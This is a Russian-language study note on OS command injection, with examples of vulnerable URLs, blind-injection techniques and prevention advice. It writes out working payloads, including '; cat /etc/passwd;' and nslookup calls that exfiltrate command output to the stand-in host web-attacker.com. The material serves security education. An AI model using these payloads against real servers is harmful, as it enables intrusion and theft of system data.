## Что такое внедрение команд ОС?

Инъекция команд ОС также известна как инъекция оболочки. Она позволяет злоумышленнику выполнять команды операционной системы (ОС) на сервере, на котором запущено приложение, и обычно полностью скомпрометировать приложение и его данные. Часто злоумышленник может использовать уязвимость инъекции команд ОС, чтобы скомпрометировать другие части инфраструктуры хостинга и использовать доверительные отношения, чтобы перенаправить атаку на другие системы в организации.

## Внедрение команд ОС

В этом примере приложение для покупок позволяет пользователю просматривать, есть ли товар на складе в определенном магазине. Доступ к этой информации осуществляется через URL:
```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

Чтобы предоставить информацию о запасах. Устаревшие системы реализовывали это через вызов командной оболочки с идентификаторами продукта и магазина в качестве аргументов:
```
stockreport.pl 381 29
```
Эта команда выводит информацию о состоянии запасов указанного товара, которая возвращается пользователю.

Приложение не реализует никакой защиты от внедрения команд ОС, поэтому злоумышленник изменяет параметр `productID`, чтобы внедрить команду для чтения файла `/etc/passwd`:
```
https://insecure-website.com/stockStatus?productID=381; cat /etc/passwd; &storeID=29
```

Результирующая команда на сервере:
```
stockreport.pl 381; cat /etc/passwd; 29
```

Ответ сервера:
```
Error - productID was not provided
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
29: command not found
```

## Полезные команды

После того, как мы определили уязвимость внедрения команд ОС, полезно выполнить некоторые начальные команды, чтобы получить информацию о системе. Ниже приведено краткое изложение некоторых команд, которые полезны на платформах Linux и Windows:

| Цель команды              | Линукс        | Винда           |
| ------------------------- | ------------- | --------------- |
| Имя текущего пользователя | `whoami`      | `whoami`        |
| Операционная система      | `uname -a`    | `ver`           |
| Конфигурация сети         | `ifconfig`    | `ipconfig /all` |
| Сетевые соединения        | `netstat -an` | `netstat -an`   |
| Запуск процессов          | `ps -ef`      | `tasklist`      |

## Уязвимости слепого внедрения команд ОС

Многие случаи внедрения команд ОС являются слепыми уязвимостями. Это означает, что приложение не возвращает вывод команды в своем HTTP-ответе. Слепые уязвимости все еще могут быть использованы, но для этого требуются другие методы.

В качестве примера представим себе веб-сайт, который позволяет пользователям отправлять отзывы о сайте. Пользователь вводит свой адрес электронной почты и сообщение для отзыва. Затем серверное приложение генерирует электронное письмо администратору сайта, содержащее отзыв. Для этого оно вызывает программу `mail`с отправленными данными:
```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```
Вывод команды `mail`(если таковой имеется) не возвращается в ответах приложения, поэтому использование `echo` полезной нагрузки не сработает. В этой ситуации мы можем использовать множество других методов для обнаружения и эксплуатации уязвимости.

### Обнаружение слепого внедрения команд ОС с использованием временных задержек

Мы можем использовать внедренную команду для запуска задержки времени, что позволит нам подтвердить, что команда была выполнена на основе времени, которое требуется приложению для ответа. `ping` Команда является хорошим способом сделать это, поскольку позволяет нам указать количество отправляемых пакетов [[Компьютерные сети/Термины#Сетевой уровень интернета ICMP — протокол управляющих сообщений интернета ICMP (Internet Control Message Protocol)|ICMP]]. Это позволяет нам контролировать время, необходимое для выполнения команды:
```
& ping -c 10 127.0.0.1 &
```
Эта команда заставляет приложение отправлять ping-запросы на свой сетевой адаптер обратной связи в течение 10 секунд, тем самым мы получим ответ от сервера лишь спустя 10 секунд, как только закончит работу команда.

#### Лаба
[[Лабораторная работа Слепое внедрение команд ОС с задержками по времени]]

### Эксплуатация слепого внедрения команд ОС путем перенаправления вывода

Мы можем перенаправить вывод из введенной команды в файл в корневом каталоге веб-сайта, который затем можно извлечь с помощью браузера. Например, если приложение обслуживает статические ресурсы из файловой системы location `/var/www/static`, то мы можем отправить следующий ввод:
```
& whoami > /var/www/static/whoami.txt &
```

Мы `>`отправляем вывод команды `whoami`в указанный файл. Затем можно использовать браузер для `https://vulnerable-website.com/whoami.txt`извлечения файла и просмотра вывода введенной команды.
#### Лаба
[[Лабораторная работа Слепое внедрение команд ОС с перенаправлением вывода]]

### Эксплуатация слепого внедрения команд ОС с использованием внеполосных (OAST) методов

Мы можем использовать введенную команду, которая запустит внеполосное сетевое взаимодействие с системой, которой мы управляем, используя методы OAST. Например:
```
& nslookup kgji2ohoyw.web-attacker.com &
```
Эта полезная нагрузка использует `nslookup`команду для вызова поиска DNS для указанного домена. Злоумышленник может отслеживать, происходит ли поиск, чтобы подтвердить, была ли команда успешно внедрена.

Вне полосный канал обеспечивает простой способ извлечения выходных данных из внедренных команд:
```
& nslookup 'whoami'.kgji2ohoyw.web-attacker.com &
```

Это вызывает DNS-поиск домена злоумышленника, содержащего результат `whoami`команды:
```
wwwuser.kgji2ohoyw.web-attacker.com
```

#### Лабы
- [[Лабораторная работа Слепое внедрение команд ОС с внеполосным взаимодействием]]

- [[Лабораторная работа Слепое внедрение команд ОС с внеполосной эксфильтрацией данных]]

# Способы внедрения команд ОС

Метасимволы оболочки — это специальные символы, которые интерпретируются командной оболочкой (shell) для выполнения определенных действий, таких как объединение команд, перенаправление вывода и т.д. Эти символы могут быть использованы для внедрения команд в уязвимые системы.

Разделители команд позволяют объединять несколько команд в одну строку. В зависимости от операционной системы, используются разные символы:

**Универсальные разделители (работают в Windows и Unix-системах):**

- `&` — выполняет команды последовательно, независимо от результата предыдущей команды.
- `&&` — выполняет следующую команду только в случае успешного завершения предыдущей.
- `|` — передает вывод одной команды на вход другой (конвейер).
- `||` — выполняет следующую команду только в случае неудачи предыдущей.

**Разделители, специфичные для Unix-систем:**

- `;` — выполняет команды последовательно, независимо от результата предыдущей.
- Новая строка (`0x0a` или `\n`) — аналогична `;`, но используется для разделения команд на разных строках.

#### Встроенные команды

В Unix-системах можно использовать обратные кавычки или символ доллара для выполнения вложенных команд:

- `` ` ``введенная команда`` ` `` — выполняет команду внутри обратных кавычек и подставляет результат в основную команду.
- `$(введенная команда)` — аналогично обратным кавычкам, но с более читаемым синтаксисом.

#### Особенности поведения метасимволов

Различные метасимволы могут вести себя по-разному в зависимости от контекста:

- **Конвейер (`|`)** — полезен для передачи вывода одной команды на вход другой, что может быть использовано для извлечения данных.
- **Логические операторы (`&&`, `||`)** — полезны для выполнения команд только при определенных условиях, что может быть использовано для слепого внедрения команд (без видимого вывода).

# Как предотвратить атаки с внедрением команд ОС

Самый эффективный способ предотвратить уязвимости внедрения команд ОС — никогда не вызывать команды ОС из кода уровня приложения. Почти во всех случаях существуют различные способы реализации требуемой функциональности с использованием более безопасных API платформы.

Если вам нужно вызывать команды ОС с пользовательским вводом, то вы должны выполнить строгую проверку ввода. Вот некоторые примеры эффективной проверки:

- Проверка по белому списку разрешенных значений.
- Проверка того, что введенные данные являются числом.
- Проверка того, что входные данные содержат только буквенно-цифровые символы, без другого синтаксиса или пробелов.

Никогда не пытайтесь очистить ввод, экранируя метасимволы оболочки. На практике это слишком подвержено ошибкам и уязвимо для обхода опытным злоумышленником.